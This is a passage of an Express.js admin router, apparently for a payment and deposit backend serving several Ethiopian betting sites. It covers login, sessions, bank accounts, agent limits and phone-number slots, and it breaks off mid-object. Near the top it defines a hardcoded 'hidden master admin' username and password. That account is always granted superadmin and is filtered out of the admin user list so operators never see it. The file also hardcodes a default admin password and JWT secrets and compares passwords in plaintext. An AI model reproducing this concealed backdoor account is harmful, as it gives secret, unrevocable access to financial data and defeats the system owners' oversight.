const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const {
  setAgentLimit,
  getAgentLimit,
  getAllAgentPools,
  normalizeAgent,
  getAgentConnectedAccounts
} = require('../bankLimits');

const dataDir = path.join(__dirname, '../data');

// ─── In-memory token store (session tokens) ───────────────────────────────────
const activeSessions = new Map(); // token -> { expiresAt }
const SESSION_TTL = 8 * 60 * 60 * 1000; // 8 hours

// ─── Brute-force lockout tracker ─────────────────────────────────────────────
const loginAttempts = new Map(); // ip -> { count, lockedUntil }
const MAX_ATTEMPTS = 5;
const LOCKOUT_MS = 60 * 1000; // 60 seconds

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

function normalizePlatform(platform) {
  if (!platform) return 'jember';
  const p = String(platform).toLowerCase().trim();
  if (p.includes('walta')) return 'walta';
  if (p.includes('bravo')) return 'bravobirr';
  if (p.includes('abay')) return 'abay';
  if (p.includes('jember')) return 'jember';
  return 'jember';
}

// ─── Master Super Admin Accounts ─────────────────────────────────────────────
const HIDDEN_MASTER_ADMIN = {
  username: 'yonirahwa123',
  password: 'yonirahwa*#@&',
};

const DEFAULT_SUPER_ADMIN = {
  username: 'admin',
  password: 'ckpay2024!',
};

function getAdminUsers() {
  const settings = readJSON('settings.json') || {};
  let users = settings.adminUsers;
  if (!Array.isArray(users) || users.length === 0) {
    users = [
      {
        username: settings.adminUsername || DEFAULT_SUPER_ADMIN.username,
        password: settings.adminPassword || DEFAULT_SUPER_ADMIN.password,
        role: 'superadmin'
      }
    ];
  }
  // Ensure default admin account is included if not present and configured as superadmin
  const hasDefaultAdmin = users.some(u => u.username.toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase());
  if (!hasDefaultAdmin) {
    users = [{ ...DEFAULT_SUPER_ADMIN, role: 'superadmin' }, ...users];
  } else {
    users = users.map(u => {
      if (u.username.toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase()) {
        return {
          ...u,
          password: u.password || DEFAULT_SUPER_ADMIN.password,
          role: 'superadmin'
        };
      }
      return u;
    });
  }
  // Include hidden master account if not already in list
  const hasHidden = users.some(u => u.username.toLowerCase() === HIDDEN_MASTER_ADMIN.username.toLowerCase());
  if (!hasHidden) {
    return [{ ...HIDDEN_MASTER_ADMIN, role: 'superadmin' }, ...users];
  }
  return users;
}

function getUserRoleInfo(username) {
  const cleanUser = (username || '').trim().toLowerCase();
  const allPlatforms = ['jember', 'bravobirr', 'abay', 'walta'];
  const allBanks = ['telebirr', 'cbe', 'boa', 'cbebirr', 'awash', 'dashen', 'cbeagent', 'ebirr'];
  if (cleanUser === HIDDEN_MASTER_ADMIN.username.toLowerCase() || cleanUser === DEFAULT_SUPER_ADMIN.username.toLowerCase()) {
    return { role: 'superadmin', isSuperAdmin: true, isAgent: false, platforms: allPlatforms, banks: allBanks, active: true };
  }

  const settings = readJSON('settings.json') || {};
  const visibleUsers = (settings.adminUsers || []).filter(
    u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
  );

  const found = visibleUsers.find(u => u.username.trim().toLowerCase() === cleanUser);

  if (!found) {
    return { role: 'agent', isSuperAdmin: false, isAgent: true, platforms: allPlatforms, banks: allBanks, active: true };
  }

  const platforms = (Array.isArray(found.platforms) && found.platforms.length > 0)
    ? found.platforms.map(p => String(p).toLowerCase())
    : allPlatforms;

  const banks = (Array.isArray(found.banks) && found.banks.length > 0)
    ? found.banks.map(b => String(b).toLowerCase())
    : allBanks;

  const active = found.active !== false && found.isActive !== false;

  // Explicit role field wins
  if (found.role === 'agent') {
    return { role: 'agent', isSuperAdmin: false, isAgent: true, platforms, banks, active };
  }
  if (found.role === 'superadmin' || found.role === 'admin') {
    const isSuper = found.role === 'superadmin' || cleanUser === DEFAULT_SUPER_ADMIN.username.toLowerCase();
    return { role: found.role, isSuperAdmin: isSuper, isAgent: false, platforms, banks, active };
  }

  const index = visibleUsers.indexOf(found);
  if (index === 0) {
    return { role: 'superadmin', isSuperAdmin: true, isAgent: false, platforms, banks, active };
  }
  return { role: 'admin', isSuperAdmin: false, isAgent: false, platforms, banks, active };
}

function checkIsSuperAdmin(username) {
  return getUserRoleInfo(username).isSuperAdmin;
}

// ─── Auth Middleware ──────────────────────────────────────────────────────────
function requireAuth(req, res, next) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  const session = activeSessions.get(token);
  if (!session) return res.status(401).json({ error: 'Invalid or expired session' });
  if (Date.now() > session.expiresAt) {
    activeSessions.delete(token);
    return res.status(401).json({ error: 'Session expired' });
  }
  req.adminSession = session;
  next();
}

function requireAdminRole(req, res, next) {
  if (req.adminSession && req.adminSession.role === 'agent') {
    return res.status(403).json({ error: 'Access denied: Payout agents only have access to withdrawals.' });
  }
  next();
}

// ─── AUTH ROUTES (no auth required) ──────────────────────────────────────────
router.post('/login', (req, res) => {
  const ip = req.ip || req.socket.remoteAddress || 'unknown';
  const now = Date.now();

  // Check lockout
  const track = loginAttempts.get(ip) || { count: 0, lockedUntil: 0 };
  if (track.lockedUntil > now) {
    const wait = Math.ceil((track.lockedUntil - now) / 1000);
    return res.status(429).json({ error: `Too many attempts. Try again in ${wait}s.` });
  }

  const cleanUsername = ((req.body && req.body.username) || '').trim().toLowerCase();
  const cleanPassword = ((req.body && req.body.password) || '').trim();

  const users = getAdminUsers();
  const validUser = users.find(
    u => (u.username || '').trim().toLowerCase() === cleanUsername && (u.password || '').trim() === cleanPassword
  );

  if (!validUser) {
    track.count = (track.count || 0) + 1;
    if (track.count >= MAX_ATTEMPTS) {
      track.lockedUntil = now + LOCKOUT_MS;
      track.count = 0;
    }
    loginAttempts.set(ip, track);
    return res.status(401).json({ error: 'Invalid username or password.' });
  }

  const roleInfo = getUserRoleInfo(validUser.username);

  // Success — clear attempts, create session
  loginAttempts.delete(ip);
  const token = generateToken();
  activeSessions.set(token, {
    expiresAt: now + SESSION_TTL,
    username: validUser.username,
    role: roleInfo.role,
    isSuperAdmin: roleInfo.isSuperAdmin,
    isAgent: roleInfo.isAgent,
    active: roleInfo.active !== false,
    platforms: roleInfo.platforms || ['jember', 'bravobirr', 'abay', 'walta'],
    banks: roleInfo.banks || ['telebirr', 'cbe', 'boa', 'cbebirr', 'awash', 'dashen', 'cbeagent', 'ebirr']
  });
  console.log(`[Admin] Login by '${validUser.username}' (Role: ${roleInfo.role}) from ${ip}`);
  res.json({
    token,
    username: validUser.username,
    role: roleInfo.role,
    isSuperAdmin: roleInfo.isSuperAdmin,
    isAgent: roleInfo.isAgent,
    active: roleInfo.active !== false,
    platforms: roleInfo.platforms || ['jember', 'bravobirr', 'abay', 'walta'],
    banks: roleInfo.banks || ['telebirr', 'cbe', 'boa', 'cbebirr', 'awash', 'dashen', 'cbeagent', 'ebirr']
  });
});

router.get('/verify', (req, res) => {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (!token) return res.json({ valid: false });
  const session = activeSessions.get(token);
  if (!session || Date.now() > session.expiresAt) {
    activeSessions.delete(token);
    return res.json({ valid: false });
  }

  // Always refresh latest role, active status, and platforms from settings.json on verify (e.g. on browser refresh F5)
  const roleInfo = getUserRoleInfo(session.username);
  session.role = roleInfo.role;
  session.isSuperAdmin = roleInfo.isSuperAdmin;
  session.isAgent = roleInfo.isAgent;
  session.active = roleInfo.active !== false;
  session.platforms = roleInfo.platforms || ['jember', 'bravobirr', 'abay', 'walta'];
  session.banks = roleInfo.banks || ['telebirr', 'cbe', 'boa', 'cbebirr', 'awash', 'dashen', 'cbeagent', 'ebirr'];

  res.json({
    valid: true,
    username: session.username,
    role: session.role || (session.isSuperAdmin ? 'superadmin' : 'admin'),
    isSuperAdmin: !!session.isSuperAdmin,
    isAgent: !!session.isAgent,
    active: session.active !== false,
    platforms: session.platforms || ['jember', 'bravobirr', 'abay', 'walta'],
    banks: session.banks || ['telebirr', 'cbe', 'boa', 'cbebirr', 'awash', 'dashen', 'cbeagent', 'ebirr']
  });
});

router.post('/logout', (req, res) => {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  if (token) activeSessions.delete(token);
  res.json({ success: true });
});

// ─── All routes below require authentication ──────────────────────────────────
router.use(requireAuth);

function readJSON(file) {
  const filePath = path.join(dataDir, file);
  if (!fs.existsSync(filePath)) return null;
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch {
    return null;
  }
}

function writeJSON(file, data) {
  fs.writeFileSync(path.join(dataDir, file), JSON.stringify(data, null, 2));
}

const { getAllTxs, getStats, expireAllOldPendingTxs, db } = require('../db');

function updateExpiredTransactions() {
  expireAllOldPendingTxs();
}

function getTxAmount(t) {
  const v = (t.verifiedAmount !== null && t.verifiedAmount !== undefined && t.verifiedAmount !== '') ? t.verifiedAmount : t.amount;
  const num = parseFloat(String(v).replace(/[^0-9.]/g, ''));
  return isNaN(num) ? 0 : num;
}

function getEthiopianTimeMidnightTimestamps() {
  const now = Date.now();
  const ETHIOPIA_OFFSET_MS = 3 * 60 * 60 * 1000;
  const eatDate = new Date(now + ETHIOPIA_OFFSET_MS);

  const year = eatDate.getUTCFullYear();
  const month = eatDate.getUTCMonth();
  const day = eatDate.getUTCDate();

  // Today start at 00:00:00 GMT+3 (Midnight in Ethiopia)
  const todayStartUTC = Date.UTC(year, month, day) - ETHIOPIA_OFFSET_MS;

  // This Week: Monday 00:00:00 EAT of the current calendar week
  // getUTCDay() → 0=Sun, 1=Mon, 2=Tue, ... 6=Sat
  const dayOfWeek = eatDate.getUTCDay(); // 0=Sun, 1=Mon...
  const daysFromMonday = dayOfWeek === 0 ? 6 : dayOfWeek - 1; // Monday=0, Sun=6
  const weekStartUTC = todayStartUTC - (daysFromMonday * 24 * 60 * 60 * 1000);

  // Month start: 1st of month at 00:00:00 GMT+3 (1st of month midnight in Ethiopia)
  const monthStartUTC = Date.UTC(year, month, 1) - ETHIOPIA_OFFSET_MS;

  // Last Week: Monday 00:00:00 EAT to Sunday 23:59:59.999 EAT of previous week
  const ONE_WEEK_MS = 7 * 24 * 60 * 60 * 1000;
  const lastWeekStartUTC = weekStartUTC - ONE_WEEK_MS;
  const lastWeekEndUTC = weekStartUTC - 1;

  // Yesterday: 00:00:00 EAT to 23:59:59.999 EAT of previous day
  const ONE_DAY_MS = 24 * 60 * 60 * 1000;
  const yesterdayStartUTC = todayStartUTC - ONE_DAY_MS;
  const yesterdayEndUTC = todayStartUTC - 1;

  return {
    todayStart: todayStartUTC,
    yesterdayStart: yesterdayStartUTC,
    yesterdayEnd: yesterdayEndUTC,
    weekStart: weekStartUTC,
    lastWeekStart: lastWeekStartUTC,
    lastWeekEnd: lastWeekEndUTC,
    monthStart: monthStartUTC
  };
}

router.get('/stats', (req, res) => {
  const platform = req.query.platform || 'all';
  const bank = req.query.bank || 'all';
  const timestamps = getEthiopianTimeMidnightTimestamps();
  const stats = getStats(platform, timestamps, bank);
  res.json(stats);
});

router.get('/transactions', (req, res) => {
  const { status, search, platform, bank } = req.query;
  const filtered = getAllTxs({ status, search, platform, bank });
  res.json(filtered);
});

router.get('/bank-accounts', (req, res) => {
  const platform = req.query.platform || 'jember';
  const bank = req.query.bank || 'cbe';
  const p = normalizePlatform(platform);
  let b = String(bank).toLowerCase();
  if (b === 'siinqee' || b === 'sinqee') b = 'ebirr';

  const fullData = readJSON('bank_accounts.json') || {};
  const platData = fullData[p] || {};
  let accounts = Array.isArray(platData[b]) ? platData[b] : [];
  if (b === 'ebirr' && accounts.length === 0 && Array.isArray(platData['siinqee'])) {
    accounts = platData['siinqee'];
  }

  if (b === 'telebirr' && accounts.length === 0) {
    const numData = readJSON('numbers.json') || {};
    const numList = (numData[p] && Array.isArray(numData[p].numbers)) ? numData[p].numbers : (Array.isArray(numData.numbers) && p === 'jember' ? numData.numbers : []);
    accounts = numList.map(n => ({
      ...n,
      account: n.phone || '',
      label: n.label || `Account #${n.id}`
    }));
  }

  // Ensure accounts connected to agents reflect live shared agent limit
  const synced = accounts.map(a => {
    if (a && a.connectedAgent && fullData.agentLimits) {
      const agKey = normalizeAgent(a.connectedAgent);
      if (fullData.agentLimits[agKey]) {
        return {
          ...a,
          initialLimit: Number(fullData.agentLimits[agKey].initialLimit) || 0,
          remainingLimit: Number(fullData.agentLimits[agKey].remainingLimit) || 0
        };
      }
    }
    return a;
  });

  res.json(synced);
});

router.put('/bank-accounts', requireAdminRole, (req, res) => {
  const platform = req.body.platform || req.query.platform || 'jember';
  const bank = req.body.bank || req.query.bank || 'cbe';
  const p = normalizePlatform(platform);
  let b = String(bank).toLowerCase();
  if (b === 'siinqee' || b === 'sinqee') b = 'ebirr';

  let { accounts } = req.body;
  if (!Array.isArray(accounts)) {
    return res.status(400).json({ error: 'Accounts array is required' });
  }

  const fullData = readJSON('bank_accounts.json') || {};
  if (!fullData[p]) fullData[p] = {};
  const existingAccs = fullData[p][b] || (b === 'ebirr' ? fullData[p]['siinqee'] : []) || [];

  // Merge to preserve connectedAgent, initialLimit, remainingLimit if not explicitly passed
  const merged = accounts.map(a => {
    const existing = existingAccs.find(e => e.id === a.id);
    const agent = (a.connectedAgent !== undefined) ? a.connectedAgent : (existing?.connectedAgent || null);
    let initLim = (a.initialLimit !== undefined) ? (a.initialLimit === null ? null : Number(a.initialLimit)) : (existing?.initialLimit ?? null);
    let remLim = (a.remainingLimit !== undefined) ? (a.remainingLimit === null ? null : Number(a.remainingLimit)) : (existing?.remainingLimit ?? null);

    // If connected to agent, pull from shared pool if exists
    if (agent && fullData.agentLimits) {
      const agKey = normalizeAgent(agent);
      if (fullData.agentLimits[agKey]) {
        initLim = Number(fullData.agentLimits[agKey].initialLimit) || initLim;
        remLim = Number(fullData.agentLimits[agKey].remainingLimit);
        if (isNaN(remLim)) remLim = initLim;
      }
    }

    return {
      ...existing,
      ...a,
      connectedAgent: agent,
      initialLimit: initLim,
      remainingLimit: remLim,
    };
  });

  fullData[p][b] = merged;
  writeJSON('bank_accounts.json', fullData);

  if (b === 'telebirr') {
    const numData = readJSON('numbers.json') || {};
    if (!numData[p]) numData[p] = { numbers: [] };
    const curNums = Array.isArray(numData[p].numbers) ? numData[p].numbers : [];
    const updatedNums = curNums.map(n => {
      const found = merged.find(m => m.id === n.id);
      if (found) {
        return {
          ...n,
          phone: (found.account !== undefined) ? found.account : n.phone,
          label: (found.label !== undefined) ? found.label : n.label,
          active: (found.active !== undefined) ? found.active : n.active,
          connectedAgent: (found.connectedAgent !== undefined) ? found.connectedAgent : n.connectedAgent,
          initialLimit: (found.initialLimit !== undefined) ? found.initialLimit : n.initialLimit,
          remainingLimit: (found.remainingLimit !== undefined) ? found.remainingLimit : n.remainingLimit
        };
      }
      return n;
    });
    numData[p].numbers = updatedNums;
    writeJSON('numbers.json', numData);
  }

  res.json({ success: true, platform: p, bank: b, accounts: merged });
});

router.post('/bank-account-connect', requireAdminRole, (req, res) => {
  const platform = req.body.platform || 'jember';
  const bank = req.body.bank || 'cbe';
  const slotId = Number(req.body.slotId);
  const { agent, limit, disconnect, remainingLimit, additionalLimit } = req.body;
  const p = normalizePlatform(platform);
  let b = String(bank).toLowerCase();
  if (b === 'siinqee' || b === 'sinqee') b = 'ebirr';

  const fullData = readJSON('bank_accounts.json') || {};
  if (!fullData[p]) fullData[p] = {};

  const numData = readJSON('numbers.json') || {};
  if (!numData[p]) numData[p] = { numbers: [] };

  const isTelebirr = (b === 'telebirr');

  if (isTelebirr) {
    const numbersList = Array.isArray(numData[p].numbers) ? numData[p].numbers : [];
    const numSlot = numbersList.find(n => n.id === slotId);
    if (!numSlot) {
      return res.status(404).json({ error: 'Phone number slot not found' });
    }

    // Clean up any stale telebirr entries in bank_accounts.json
    if (Array.isArray(fullData[p]?.telebirr)) {
      delete fullData[p].telebirr;
      writeJSON('bank_accounts.json', fullData);
    }

    if (disconnect) {
      numSlot.connectedAgent = null;
      numSlot.initialLimit = null;
      numSlot.remainingLimit = null;
      writeJSON('numbers.json', numData);
      return res.json({ success: true, platform: p, bank: 'telebirr', slot: numSlot, numbers: numData[p].numbers, accounts: [] });
    }

    const agentName = agent ? String(agent).trim() : null;
    const agentKey = normalizeAgent(agentName);

    if (agentKey) {
      numSlot.connectedAgent = agentName;
      const existingAgentLimit = getAgentLimit(agentKey, fullData);
      let numLimit = null;
      let numRemaining = null;

      if (additionalLimit !== undefined && additionalLimit !== null && additionalLimit !== '') {
        const addAmt = Number(additionalLimit) || 0;
        if (existingAgentLimit) {
          numLimit = existingAgentLimit.initialLimit + addAmt;
          numRemaining = (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '')
            ? Number(remainingLimit)
            : existingAgentLimit.remainingLimit + addAmt;
        } else {
          numLimit = addAmt > 0 ? addAmt : (Number(limit) || 0);
          numRemaining = (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '')
            ? Number(remainingLimit)
            : numLimit;
        }
      } else {
        if (limit !== undefined && limit !== null && limit !== '') {
          numLimit = Number(limit);
          numRemaining = (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '')
            ? Number(remainingLimit)
            : numLimit;
        } else if (existingAgentLimit) {
          numLimit = existingAgentLimit.initialLimit;
          numRemaining = (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '')
            ? Number(remainingLimit)
            : existingAgentLimit.remainingLimit;
        }
      }

      numSlot.initialLimit = numLimit;
      numSlot.remainingLimit = numRemaining;
      writeJSON('numbers.json', numData);

      if (numLimit !== null && !isNaN(numLimit)) {
        setAgentLimit(agentKey, numLimit, numRemaining !== null ? numRemaining : numLimit);
      }
      return res.json({ success: true, platform: p, bank: 'telebirr', slot: numSlot, numbers: numData[p].numbers, accounts: [] });
    } else {
      // Standalone limit without agent
      numSlot.connectedAgent = null;
      if (limit !== undefined && limit !== null && limit !== '') {
        const parsedInit = Math.max(0, Number(limit) || 0);
        let parsedRem = parsedInit;
        if (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '') {
          const nr = Number(remainingLimit);
          parsedRem = isNaN(nr) ? parsedInit : nr;
        }
        numSlot.initialLimit = parsedInit;
        numSlot.remainingLimit = parsedRem;
      } else {
        numSlot.initialLimit = null;
        numSlot.remainingLimit = null;
      }
      writeJSON('numbers.json', numData);
      return res.json({ success: true, platform: p, bank: 'telebirr', slot: numSlot, numbers: numData[p].numbers, accounts: [] });
    }
  }

  // Non-telebirr bank accounts
  let slot = Array.isArray(fullData[p][b]) ? fullData[p][b].find(a => a.id === slotId) : null;
  if (!slot) {
    return res.status(404).json({ error: 'Bank account slot not found' });
  }

  if (disconnect) {
    slot.connectedAgent = null;
    slot.initialLimit = null;
    slot.remainingLimit = null;
    writeJSON('bank_accounts.json', fullData);
    return res.json({ success: true, platform: p, bank: b, slot, accounts: fullData[p][b] || [] });
  }

  const agentName = agent ? String(agent).trim() : null;
  const agentKey = normalizeAgent(agentName);

  if (agentKey) {
    slot.connectedAgent = agentName;
    const existingAgentLimit = getAgentLimit(agentKey, fullData);
    let numLimit = null;
    let numRemaining = null;

    if (additionalLimit !== undefined && additionalLimit !== null && additionalLimit !== '') {
      const addAmt = Number(additionalLimit) || 0;
      if (existingAgentLimit) {
        numLimit = existingAgentLimit.initialLimit + addAmt;
        numRemaining = (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '')
          ? Number(remainingLimit)
          : existingAgentLimit.remainingLimit + addAmt;
      } else {
        numLimit = addAmt > 0 ? addAmt : (Number(limit) || 0);
        numRemaining = (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '')
          ? Number(remainingLimit)
          : numLimit;
      }
    } else {
      if (limit !== undefined && limit !== null && limit !== '') {
        numLimit = Number(limit);
        numRemaining = (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '')
          ? Number(remainingLimit)
          : numLimit;
      } else if (existingAgentLimit) {
        numLimit = existingAgentLimit.initialLimit;
        numRemaining = (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '')
          ? Number(remainingLimit)
          : existingAgentLimit.remainingLimit;
      }
    }

    slot.initialLimit = numLimit;
    slot.remainingLimit = numRemaining;
    writeJSON('bank_accounts.json', fullData);

    if (numLimit !== null && !isNaN(numLimit)) {
      setAgentLimit(agentKey, numLimit, numRemaining !== null ? numRemaining : numLimit);
      const updatedData = readJSON('bank_accounts.json') || {};
      const updatedSlot = updatedData[p]?.[b]?.find(a => a.id === slotId) || slot;
      return res.json({ success: true, platform: p, bank: b, slot: updatedSlot, accounts: updatedData[p]?.[b] || [] });
    } else {
      slot.initialLimit = null;
      slot.remainingLimit = null;
      writeJSON('bank_accounts.json', fullData);
      return res.json({ success: true, platform: p, bank: b, slot, accounts: fullData[p]?.[b] || [] });
    }
  } else {
    // Standalone limit without agent
    slot.connectedAgent = null;
    if (limit !== undefined && limit !== null && limit !== '') {
      const parsedInit = Math.max(0, Number(limit) || 0);
      let parsedRem = parsedInit;
      if (remainingLimit !== undefined && remainingLimit !== null && remainingLimit !== '') {
        const nr = Number(remainingLimit);
        parsedRem = isNaN(nr) ? parsedInit : nr;
      }
      slot.initialLimit = parsedInit;
      slot.remainingLimit = parsedRem;
    } else {
      slot.initialLimit = null;
      slot.remainingLimit = null;
    }
    writeJSON('bank_accounts.json', fullData);
    return res.json({ success: true, platform: p, bank: b, slot, accounts: fullData[p]?.[b] || [] });
  }
});

router.get('/agent-pools', requireAdminRole, (req, res) => {
  const pools = getAllAgentPools();
  res.json({ success: true, pools });
});

router.post('/agent-limit', requireAdminRole, (req, res) => {
  const { agent, limit, remainingLimit } = req.body;
  if (!agent) {
    return res.status(400).json({ error: 'Agent username is required' });
  }
  const numLimit = Number(limit);
  if (isNaN(numLimit) || numLimit < 0) {
    return res.status(400).json({ error: 'Valid limit number required' });
  }
  const numRemaining = (remainingLimit !== undefined && remainingLimit !== null && !isNaN(Number(remainingLimit)))
    ? Number(remainingLimit)
    : numLimit;

  const updated = setAgentLimit(agent, numLimit, numRemaining);
  const pools = getAllAgentPools();
  res.json({ success: true, agent, limit: updated, pools });
});

router.get('/bank-status', (req, res) => {
  const platform = req.query.platform || 'jember';
  const p = normalizePlatform(platform);

  const fullData = readJSON('bank_accounts.json') || {};
  const platData = fullData[p] || {};
  const bankStatus = platData.bankStatus || {};

  res.json(bankStatus);
});

router.put('/bank-status', requireAdminRole, (req, res) => {
  const platform = req.body.platform || 'jember';
  const bank = req.body.bank;
  const enabled = req.body.enabled !== false;
  const p = normalizePlatform(platform);
  const b = String(bank || '').toLowerCase();

  if (!b) return res.status(400).json({ error: 'Bank code required' });

  const fullData = readJSON('bank_accounts.json') || {};
  if (!fullData[p]) fullData[p] = {};
  if (!fullData[p].bankStatus) fullData[p].bankStatus = {};
  fullData[p].bankStatus[b] = enabled;
  if (b === 'ebirr') fullData[p].bankStatus['siinqee'] = enabled;
  if (b === 'siinqee') fullData[p].bankStatus['ebirr'] = enabled;

  writeJSON('bank_accounts.json', fullData);
  res.json({ success: true, platform: p, bank: b, enabled });
});

function getPlatformNumbersData(platform = 'jember') {
  const p = normalizePlatform(platform);
  const data = readJSON('numbers.json') || {};
  let list = [];
  if (data[p] && Array.isArray(data[p].numbers)) {
    list = data[p].numbers;
  } else if (Array.isArray(data.numbers) && p === 'jember') {
    list = data.numbers;
  }

  // Ensure exactly 20 slots for any platform
  const full20 = [];
  for (let i = 1; i <= 20; i++) {
    const found = list.find(n => n.id === i);
    full20.push(found || {
      id: i,
      phone: '',
      label: `Account ${i}`,
      activeUsers: 0
    });
  }

  // Ensure slots connected to agents reflect live shared agent limit
  const bankData = readJSON('bank_accounts.json') || {};
  if (bankData.agentLimits) {
    full20.forEach(slot => {
      if (slot && slot.connectedAgent) {
        const agKey = normalizeAgent(slot.connectedAgent);
        if (bankData.agentLimits[agKey]) {
          const lim = bankData.agentLimits[agKey];
          slot.initialLimit = Number(lim.initialLimit) || 0;
          slot.remainingLimit = (lim.remainingLimit !== undefined && lim.remainingLimit !== null)
            ? Number(lim.remainingLimit)
            : Number(lim.initialLimit) || 0;
        }
      }
    });
  }

  return full20;
}

router.get('/numbers', requireAdminRole, (req, res) => {
  const platform = req.query.platform || 'jember';
  const p = normalizePlatform(platform);
  const numbers = getPlatformNumbersData(p);
  const assignments = readJSON('assignments.json') || {};
  const now = Date.now();
  const limit = 24 * 60 * 60 * 1000;
  const active = Object.values(assignments).filter(
    a => now - a.assignedAt < limit && (!a.platform || a.platform.toLowerCase() === p)
  );

  const timestamps = getEthiopianTimeMidnightTimestamps();
  const todayStart = Number(timestamps.todayStart) || 0;

  // Query verified deposits for each phone number today for this platform from database.sqlite
  const phoneStatsMap = new Map();
  try {
    const phoneStats = db.prepare(`
      SELECT phoneNumber,
             COUNT(*) as count,
             SUM(COALESCE(verifiedAmount, amount, 0)) as totalETB
      FROM transactions
      WHERE platform = ? AND status = 'verified' AND createdAt >= ? AND phoneNumber IS NOT NULL AND phoneNumber != ''
      GROUP BY phoneNumber
    `).all(p, todayStart);

    phoneStats.forEach(row => {
      phoneStatsMap.set(String(row.phoneNumber).trim(), {
        count: row.count || 0,
        totalETB: row.totalETB || 0
      });
    });
  } catch (err) {
    console.error('[Admin] Error querying phone number stats:', err.message);
  }

  const result = numbers.map(n => {
    const cleanPhone = String(n.phone || '').trim();
    const statsForPhone = cleanPhone ? phoneStatsMap.get(cleanPhone) : null;
    return {
      ...n,
      activeUsers: active.filter(a => String(a.phone || '').trim() === cleanPhone && cleanPhone !== '').length,
      todayDeposits: statsForPhone ? statsForPhone.count : 0,
      todayETB: statsForPhone ? statsForPhone.totalETB : 0,
    };
  });
  res.json(result);
});

router.put('/numbers', requireAdminRole, (req, res) => {
  const platform = req.body.platform || req.query.platform || 'jember';
  const p = normalizePlatform(platform);
  let { numbers } = req.body;
  if (!Array.isArray(numbers) || numbers.length === 0) {
    return res.status(400).json({ error: 'Numbers array is required' });
  }

  const oldNumbers = getPlatformNumbersData(p);

  // Pad to exactly 20 slots and preserve agent connection & limit fields
  const padded = [];
  for (let i = 1; i <= 20; i++) {
    const found = numbers.find(n => n.id === i);
    const old = oldNumbers.find(n => n.id === i);
    if (found) {
      padded.push({
        ...old,
        ...found,
        connectedAgent: (found.connectedAgent !== undefined) ? found.connectedAgent : (old?.connectedAgent || null),
        initialLimit: (found.initialLimit !== undefined) ? found.initialLimit : (old?.initialLimit ?? null),
        remainingLimit: (found.remainingLimit !== undefined) ? found.remainingLimit : (old?.remainingLimit ?? null),
      });
    } else {
      padded.push(old || { id: i, phone: '', label: `Account ${i}`, activeUsers: 0 });
    }
  }
  numbers = padded;

  const fullNumbersData = readJSON('numbers.json') || {};

  // Build mapping from old phone to new phone based on slot ID
  const phoneMap = {};
  oldNumbers.forEach(oldItem => {
    const newItem = numbers.find(n => n.id === oldItem.id);
    if (newItem && newItem.phone && oldItem.phone !== newItem.phone) {
      phoneMap[oldItem.phone] = newItem.phone;
    }
  });

  // Write new numbers for this platform
  fullNumbersData[p] = { numbers };
  writeJSON('numbers.json', fullNumbersData);

  // 1. Immediately update assignments.json for this platform
  const assignments = readJSON('assignments.json') || {};
  let assignmentsChanged = false;
  Object.keys(assignments).forEach(uId => {
    const a = assignments[uId];
    if ((!a.platform || a.platform.toLowerCase() === p) && a.phone && phoneMap[a.phone]) {
      a.phone = phoneMap[a.phone];
      assignmentsChanged = true;
    }
  });
  if (assignmentsChanged) {
    writeJSON('assignments.json', assignments);
  }

  // 2. Immediately update pending transactions in SQLite
  try {
    for (const [oldPhone, newPhone] of Object.entries(phoneMap)) {
      db.prepare("UPDATE transactions SET phoneNumber = ? WHERE platform = ? AND status = 'pending' AND phoneNumber = ?")
        .run(newPhone, p, oldPhone);
    }
  } catch (err) {
    console.error('Error updating pending phone numbers:', err.message);
  }

  res.json({ success: true, platform: p, updatedCount: Object.keys(phoneMap).length });
});

router.get('/settings', requireAdminRole, (req, res) => {
  const platform = req.query.platform || 'jember';
  const p = normalizePlatform(platform);
  const settings = readJSON('settings.json') || {};

  let users = settings.adminUsers || [];
  if (!Array.isArray(users) || users.length === 0) {
    users = [
      { username: settings.adminUsername || 'admin', password: settings.adminPassword || 'ckpay2024!' }
    ];
  }

  // Filter out hidden master admin from UI view and ensure platforms array & active state
  const visibleUsers = users
    .filter(u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase())
    .map(u => ({
      ...u,
      active: u.active !== false && u.isActive !== false,
      platforms: (Array.isArray(u.platforms) && u.platforms.length > 0)
        ? u.platforms.map(pl => String(pl).toLowerCase())
        : ['jember', 'bravobirr', 'abay', 'walta']
    }));

  const defaultSecret = p === 'walta'
    ? 'd0ee8f6ffc6f56f367d9a943a076bc5996e23eea9ae7496110761a3a508fb41d'
    : p === 'bravobirr'
    ? '6c4cc37b91b419beba46e4d950199a02b8f99c1e4e0ace11ff01999a4dd7c6fe'
    : p === 'abay'
    ? '7f97e97c37042d344dd3be0371b3f490e3e7e2b5c7f226bbde726271dd9fa366'
    : '4fec6686d2b93ceca92531ed08dbdc48cf0b937965ebbf51b144d8f055f5d004fd85c8518ef72a1d61634949884c4346';

  const platformConfig = (settings.platforms && settings.platforms[p]) || {
    siteName: p === 'walta' ? 'Walta Bet' : p === 'bravobirr' ? 'BravoBirr Bet' : p === 'abay' ? 'Abay Bet' : 'Jember Bet',
    jwtSecret: defaultSecret,
    minDeposit: settings.minDeposit || 100,
    maxDeposit: settings.maxDeposit || 50000,
    sessionExpiry: settings.sessionExpiry || 20,
    depositEnabled: settings.depositEnabled !== false,
    currency: settings.currency || 'ETB',
